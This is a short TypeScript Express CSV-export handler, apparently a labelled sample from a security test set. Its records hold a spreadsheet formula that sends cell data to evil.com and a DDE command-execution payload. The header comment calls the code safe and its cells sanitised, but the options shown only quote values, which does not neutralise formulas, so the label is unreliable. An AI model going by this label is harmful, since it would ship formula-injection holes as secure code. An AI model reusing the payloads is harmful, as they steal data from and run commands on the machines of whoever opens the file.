// SAFE: CSV cells are sanitised via a dedicated CSV serialisation library.
import { Request, Response } from 'express';
import { stringify } from 'csv-stringify/sync';

export async function exportUsers(req: Request, res: Response): Promise<void> {
  const users = [
    { id: '1', name: 'Alice', email: 'alice@example.com' },
    { id: '2', name: 'Bob', email: 'bob@example.com' },
    { id: '3', name: '=HYPERLINK("http://evil.com?exfil="&A1,"click")', email: '=cmd|/C calc!A0' },
  ];

  const output = stringify(users, { header: true, quoted: true, quoted_string: true });

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="users.csv"');
  res.send(output);
}
